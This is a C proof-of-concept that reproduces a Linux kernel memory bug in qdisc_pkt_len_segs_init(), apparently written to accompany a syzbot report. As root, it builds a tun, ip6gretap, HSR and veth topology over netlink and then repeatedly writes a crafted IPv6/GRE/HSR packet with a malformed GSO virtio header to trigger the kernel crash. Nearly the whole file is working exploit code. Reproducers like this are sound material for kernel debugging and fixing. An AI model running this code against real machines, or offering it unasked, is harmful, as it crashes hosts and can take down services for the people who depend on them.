/*
 * qdisc_uaf_repro_hsr.c
 *
 * Pure-userspace reproducer for the qdisc_pkt_len_segs_init() stale
 * transport_header bug, matching the original syzbot call trace:
 *
 *   tun_get_user -> __netif_receive_skb_core -> hsr_handle_frame
 *   -> hsr_forward_skb -> hsr_xmit -> __dev_queue_xmit
 *   -> qdisc_pkt_len_segs_init
 *
 * Topology:
 *   /dev/net/tun (syzq0) -> ip6gretap (gt1) -> hsr0 (HSR v0)
 *                            -> veth0 (slave) / veth1 (interlink)
 *
 * The frame is an IPv6/GRE/TEB packet whose Ethernet payload is an HSRv0
 * frame (ethertype 0x88FB) with an HSR tag.  After GRE/TEB decap the skb
 * carries a stale transport_header left over from GRO processing of the
 * inner IPv4/TCP segment.  HSR forwarding clones the skb and transmits it
 * on the slave port, where dev_queue_xmit -> qdisc_pkt_len_segs_init()
 * dereferences skb->data + negative_offset and crashes.
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/if_tunnel.h>
#include <linux/ipv6.h>
#include <linux/ip.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/virtio_net.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef NEXTHDR_DEST
#define NEXTHDR_DEST 60
#endif

#ifndef IFLA_HSR_SLAVE1
#define IFLA_HSR_SLAVE1 1
#endif
#ifndef IFLA_HSR_SLAVE2
#define IFLA_HSR_SLAVE2 2
#endif
#ifndef IFLA_HSR_PROTOCOL
#define IFLA_HSR_PROTOCOL 7
#endif
#ifndef IFLA_HSR_INTERLINK
#define IFLA_HSR_INTERLINK 8
#endif

#define HSR_PROTOCOL_HSR 0

#define TUN_IFNAME "syzq0"
#define GRETAP_IFNAME "gt1"
#define HSR_IFNAME "hsr0"
#define HSR_SLAVE1 "gt1"
#define HSR_SLAVE2 "veth0"
#define HSR_INTERLINK "veth1"
#define PKT_LEN 1400
#define OUTER_DEST_OPTS_BYTES 256
#define IPV4_DF_FLAG 0x4000

#define TUN_LOCAL_IPV6 "2001:db8:1::1"
#define TUN_REMOTE_IPV6 "2001:db8:1::2"

#ifndef ETH_P_HSR
#define ETH_P_HSR 0x88FB
#endif

struct hsr_tag {
	__be16 path_and_LSDU_size;
	__be16 sequence_nr;
	__be16 encap_proto;
} __attribute__((packed));

struct tun_pi_hdr {
	uint16_t flags;
	uint16_t proto;
} __attribute__((packed));

struct gre_base_hdr_uapi {
	uint16_t flags;
	uint16_t protocol;
} __attribute__((packed));

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[1024];
	va_list ap;
	int ret;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	ret = system(cmd);
	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(EXIT_FAILURE);
	}
}

static int get_ifindex(const char *ifname)
{
	int ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		fprintf(stderr, "if_nametoindex(%s) failed\n", ifname);
		exit(EXIT_FAILURE);
	}
	return ifindex;
}

static void set_link_up(const char *ifname)
{
	run_cmd("ip link set %s up", ifname);
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen,
		      int type, const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen) {
		fprintf(stderr, "netlink attribute overflow\n");
		exit(EXIT_FAILURE);
	}

	rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
}

static struct rtattr *addattr_nest(struct nlmsghdr *nlh, size_t maxlen, int type)
{
	struct rtattr *nest = (struct rtattr *)(((char *)nlh) +
					    NLMSG_ALIGN(nlh->nlmsg_len));
	addattr_l(nlh, maxlen, type, NULL, 0);
	return nest;
}

static void addattr_nest_end(struct nlmsghdr *nlh, struct rtattr *nest)
{
	nest->rta_len = (char *)nlh + nlh->nlmsg_len - (char *)nest;
}

static int nl_talk(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
	char buf[4096];
	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct nlmsghdr *reply;
	ssize_t ret;

	ret = sendmsg(fd, &msg, 0);
	if (ret < 0)
		return -1;

	ret = recv(fd, buf, sizeof(buf), 0);
	if (ret < 0)
		return -1;

	reply = (struct nlmsghdr *)buf;
	for (; NLMSG_OK(reply, (unsigned int)ret);
	     reply = NLMSG_NEXT(reply, ret)) {
		if (reply->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *err = NLMSG_DATA(reply);
			if (!err->error)
				return 0;
			errno = -err->error;
			return -1;
		}
	}

	errno = EPROTO;
	return -1;
}

static void add_hsr_link(const char *ifname, int slave1_ifindex,
			 int slave2_ifindex, int interlink_ifindex,
			 uint8_t protocol)
{
	char reqbuf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)reqbuf;
	struct ifinfomsg *ifm;
	struct rtattr *linkinfo, *infodata;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifm));
	nlh->nlmsg_type = RTM_NEWLINK;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	ifm = NLMSG_DATA(nlh);
	ifm->ifi_family = AF_UNSPEC;

	addattr_l(nlh, sizeof(reqbuf), IFLA_IFNAME, ifname, strlen(ifname) + 1);
	linkinfo = addattr_nest(nlh, sizeof(reqbuf), IFLA_LINKINFO);
	addattr_l(nlh, sizeof(reqbuf), IFLA_INFO_KIND, "hsr",
		  strlen("hsr") + 1);
	infodata = addattr_nest(nlh, sizeof(reqbuf), IFLA_INFO_DATA);
	addattr_l(nlh, sizeof(reqbuf), IFLA_HSR_SLAVE1, &slave1_ifindex,
		  sizeof(slave1_ifindex));
	addattr_l(nlh, sizeof(reqbuf), IFLA_HSR_SLAVE2, &slave2_ifindex,
		  sizeof(slave2_ifindex));
	if (interlink_ifindex)
		addattr_l(nlh, sizeof(reqbuf), IFLA_HSR_INTERLINK,
			  &interlink_ifindex, sizeof(interlink_ifindex));
	addattr_l(nlh, sizeof(reqbuf), IFLA_HSR_PROTOCOL, &protocol,
		  sizeof(protocol));
	addattr_nest_end(nlh, infodata);
	addattr_nest_end(nlh, linkinfo);

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket(NETLINK_ROUTE)");
	if (nl_talk(fd, nlh) < 0 && errno != EEXIST)
		die("RTM_NEWLINK hsr");
	close(fd);
}

static int open_tun(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0)
		die("open(/dev/net/tun)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
	ifr.ifr_flags = IFF_TUN | IFF_VNET_HDR | IFF_TUN_EXCL;
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		die("ioctl(TUNSETIFF)");

	return fd;
}

static int setup_topology(void)
{
	int slave1_ifindex, slave2_ifindex, interlink_ifindex;
	int tun_fd;

	tun_fd = open_tun(TUN_IFNAME);

	run_cmd("ip -6 addr flush dev %s 2>/dev/null || true", TUN_IFNAME);
	run_cmd("ip -6 addr replace %s/64 dev %s nodad",
		TUN_LOCAL_IPV6, TUN_IFNAME);
	run_cmd("ip link set %s mtu 1500", TUN_IFNAME);
	set_link_up(TUN_IFNAME);

	run_cmd("ip link del %s >/dev/null 2>&1 || true", HSR_IFNAME);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", GRETAP_IFNAME);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", HSR_SLAVE2);
	run_cmd("ip link del %s >/dev/null 2>&1 || true", HSR_INTERLINK);

	run_cmd("ip link add %s type ip6gretap local %s remote %s dev %s ttl 64 encaplimit 4",
		GRETAP_IFNAME, TUN_LOCAL_IPV6, TUN_REMOTE_IPV6, TUN_IFNAME);
	run_cmd("ip link set %s mtu 1500", GRETAP_IFNAME);
	set_link_up(GRETAP_IFNAME);

	run_cmd("ip link add %s type veth peer name %s", HSR_SLAVE2, HSR_INTERLINK);
	set_link_up(HSR_SLAVE2);
	set_link_up(HSR_INTERLINK);

	slave1_ifindex = get_ifindex(GRETAP_IFNAME);
	slave2_ifindex = get_ifindex(HSR_SLAVE2);
	interlink_ifindex = get_ifindex(HSR_INTERLINK);
	add_hsr_link(HSR_IFNAME, slave1_ifindex, slave2_ifindex,
		     interlink_ifindex, HSR_PROTOCOL_HSR);
	set_link_up(HSR_IFNAME);

	return tun_fd;
}

static uint16_t ipv4_checksum(const void *data, size_t len)
{
	const uint16_t *words = data;
	uint32_t sum = 0;
	size_t i;

	for (i = 0; i < len / 2; i++)
		sum += ntohs(words[i]);

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return htons((uint16_t)~sum);
}

static size_t build_inner_packet(uint8_t *buf, size_t pkt_len)
{
	struct ipv6hdr *outer6 = (struct ipv6hdr *)buf;
	uint8_t *outer_opts = buf + sizeof(*outer6);
	struct gre_base_hdr_uapi *gre;
	struct hsr_tag *htag;
	struct iphdr *inner4;
	struct tcphdr *tcp;
	uint8_t *payload;
	size_t inner_payload_len;
	size_t outer_payload_len;
	size_t l2_len = sizeof(struct ethhdr) + sizeof(struct hsr_tag);

	if (pkt_len < sizeof(*outer6) + OUTER_DEST_OPTS_BYTES + sizeof(*gre) +
	    l2_len + sizeof(*inner4) + sizeof(*tcp) + 64) {
		fprintf(stderr, "packet length too small: %zu\n", pkt_len);
		exit(EXIT_FAILURE);
	}

	memset(buf, 0, pkt_len);

	gre = (struct gre_base_hdr_uapi *)(outer_opts + OUTER_DEST_OPTS_BYTES);
	htag = (struct hsr_tag *)((uint8_t *)gre + sizeof(*gre) + sizeof(struct ethhdr));
	inner4 = (struct iphdr *)((uint8_t *)htag + sizeof(*htag));
	tcp = (struct tcphdr *)((uint8_t *)inner4 + sizeof(*inner4));
	payload = (uint8_t *)tcp + sizeof(*tcp);

	outer_payload_len = pkt_len - sizeof(*outer6);
	inner_payload_len = pkt_len - sizeof(*outer6) - OUTER_DEST_OPTS_BYTES -
		    sizeof(*gre) - l2_len -
		    sizeof(*inner4) - sizeof(*tcp);

	outer6->version = 6;
	outer6->flow_lbl[2] = 0x01;
	outer6->payload_len = htons((uint16_t)outer_payload_len);
	outer6->nexthdr = NEXTHDR_DEST;
	outer6->hop_limit = 64;

	if (inet_pton(AF_INET6, TUN_REMOTE_IPV6, &outer6->saddr) != 1 ||
	    inet_pton(AF_INET6, TUN_LOCAL_IPV6, &outer6->daddr) != 1) {
		fprintf(stderr, "inet_pton(AF_INET6) failed\n");
		exit(EXIT_FAILURE);
	}

	outer_opts[0] = IPPROTO_GRE;
	outer_opts[1] = (uint8_t)((OUTER_DEST_OPTS_BYTES >> 3) - 1);
	outer_opts[2] = 0x1e;
	outer_opts[3] = (uint8_t)(OUTER_DEST_OPTS_BYTES - 4);

	gre->flags = 0;
	gre->protocol = htons(ETH_P_TEB);

	{
		struct ethhdr *eth = (struct ethhdr *)((uint8_t *)gre + sizeof(*gre));
		uint8_t src[ETH_ALEN] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 };
		uint8_t dst[ETH_ALEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
		memcpy(eth->h_source, src, ETH_ALEN);
		memcpy(eth->h_dest, dst, ETH_ALEN);
		eth->h_proto = htons(ETH_P_HSR);
	}

	htag->path_and_LSDU_size = htons(0x0000 | ((uint16_t)(inner_payload_len +
				sizeof(*inner4) + sizeof(*tcp)) & 0x0FFF));
	htag->sequence_nr = htons(0x0001);
	htag->encap_proto = htons(ETH_P_IP);

	inner4->version = 4;
	inner4->ihl = 5;
	inner4->tot_len = htons((uint16_t)(sizeof(*inner4) + sizeof(*tcp) +
				   inner_payload_len));
	inner4->id = htons(0x1234);
	inner4->frag_off = htons(IPV4_DF_FLAG);
	inner4->ttl = 64;
	inner4->protocol = IPPROTO_TCP;
	inner4->saddr = htonl(0x0a000001);
	inner4->daddr = htonl(0x0a000002);
	inner4->check = ipv4_checksum(inner4, sizeof(*inner4));

	tcp->source = htons(12345);
	tcp->dest = htons(23456);
	tcp->seq = htonl(1);
	tcp->doff = 5;
	tcp->syn = 1;
	tcp->window = htons(4096);

	for (size_t i = 0; i < inner_payload_len; i++)
		payload[i] = (uint8_t)(i & 0xff);

	return pkt_len;
}

static size_t build_write_buffer(uint8_t **out)
{
	struct tun_pi_hdr *pi;
	struct virtio_net_hdr *vhdr;
	uint8_t *buf;
	size_t total_len = sizeof(*pi) + sizeof(*vhdr) + PKT_LEN;

	buf = calloc(1, total_len);
	if (!buf)
		die("calloc");

	pi = (struct tun_pi_hdr *)buf;
	vhdr = (struct virtio_net_hdr *)(buf + sizeof(*pi));

	pi->flags = 0;
	pi->proto = htons(ETH_P_IPV6);

	vhdr->flags = 0;
	vhdr->gso_type = VIRTIO_NET_HDR_GSO_TCPV4;
	vhdr->hdr_len = htole16(17);
	vhdr->gso_size = htole16(4);
	vhdr->csum_start = htole16(0);
	vhdr->csum_offset = htole16(0x0ca6);

	build_inner_packet(buf + sizeof(*pi) + sizeof(*vhdr), PKT_LEN);

	*out = buf;
	return total_len;
}

int main(void)
{
	uint8_t *buf = NULL;
	size_t total_len;
	int tun_fd;

	if (getuid() != 0) {
		fprintf(stderr, "this reproducer must run as root\n");
		return EXIT_FAILURE;
	}

	tun_fd = setup_topology();
	total_len = build_write_buffer(&buf);

	printf("packet_len: %d\n", PKT_LEN);
	printf("write_len: %zu\n", total_len);
	printf("topology: tun(%s) -> ip6gretap(%s) -> hsrv0(%s) -> %s/%s (interlink)\n",
	       TUN_IFNAME, GRETAP_IFNAME, HSR_IFNAME, HSR_SLAVE2, HSR_INTERLINK);
	printf("outer: IPv6/dst-opts(%d)/GRE(TEB)\n", OUTER_DEST_OPTS_BYTES);
	printf("inner: Ethernet/IPv4/TCP\n");
	printf("sending via /dev/net/tun bound to %s...\n", TUN_IFNAME);

	for (int i = 0; i < 10; i++) {
		if (write(tun_fd, buf, total_len) != (ssize_t)total_len)
			die("write tun");
		printf("write[%d] ok\n", i);
	}

	run_cmd("ip -s link show %s", GRETAP_IFNAME);
	run_cmd("ip -s link show %s", HSR_SLAVE2);

	printf("linger: 5 seconds\n");
	sleep(5);

	free(buf);
	close(tun_fd);
	return 0;
}
